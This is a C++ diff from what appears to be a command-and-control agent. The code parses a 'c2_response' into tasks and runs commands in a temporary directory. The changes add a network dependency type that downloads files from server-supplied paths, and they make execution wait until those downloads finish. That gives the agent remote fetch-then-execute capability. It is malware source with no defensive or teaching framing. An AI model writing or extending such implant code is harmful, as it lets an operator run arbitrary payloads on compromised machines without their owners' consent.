@@ -65,6 +65,18 @@ bool LocalFileDep::Retrieve() {
     return true;
 }
 
+bool NetworkFileDep::Retrieve() {
+    if (name.empty() or path.empty()) return false;
+
+    // Don't throw for any error, but do print it
+    try {
+        return request::DownloadFile(path, name);
+    } catch (const fs::filesystem_error& e) {
+        std::cerr << e.what() << std::endl;
+        return false;
+    }
+}
+
 Command::Command(std::string& c2_response) {
     // Parse into something resembling a nested unordered map
     rapidjson::Document json;
@@ -92,7 +104,7 @@ Command::Command(std::string& c2_response) {
 
 void Command::ParseFileDeps_(const rapidjson::Value& deps) {
     /* Loop through array of JSON objects, validating along the way. Invalid
-     * strings for file name or path will default to empty strings. These
+     * strings for file name, path, or type will default to empty strings. These
      * invalid files should be ignored. */
     int size = deps.Size();
     for (int i = 0; i < size; ++i) {
@@ -102,10 +114,19 @@ void Command::ParseFileDeps_(const rapidjson::Value& deps) {
                 file["name"].IsString() ? file["name"].GetString() : "";
             std::string path =
                 file["path"].IsString() ? file["path"].GetString() : "";
+            std::string type =
+                file["type"].IsString() ? file["type"].GetString() : "";
 
-            if (not(name.empty() or path.empty())) {
-                auto file_ptr = std::make_unique<LocalFileDep>(name, path);
-                command_deps_.emplace_back(std::move(file_ptr));
+            if (not(name.empty() or path.empty() or type.empty())) {
+                // Determine dependency type and add to vector
+                if (type == "local") {
+                    auto file_ptr = std::make_unique<LocalFileDep>(name, path);
+                    command_deps_.emplace_back(std::move(file_ptr));
+                } else if (type == "network") {
+                    auto file_ptr =
+                        std::make_unique<NetworkFileDep>(name, path);
+                    command_deps_.emplace_back(std::move(file_ptr));
+                }
             }
         }
     }
@@ -137,6 +158,9 @@ std::string Command::Execute() {
         dep_retrieval_futures.push_back(std::async(
             std::launch::async, &CommandDependency::Retrieve, dep.get()));
     }
+
+    // Wait for dependencies to be retrieved
+    for (auto& retrieved : dep_retrieval_futures) retrieved.wait();
 
     /* Finally execute and leave temp directory. The TempDirectory instance will
      * delete the folder upon going out of scope */
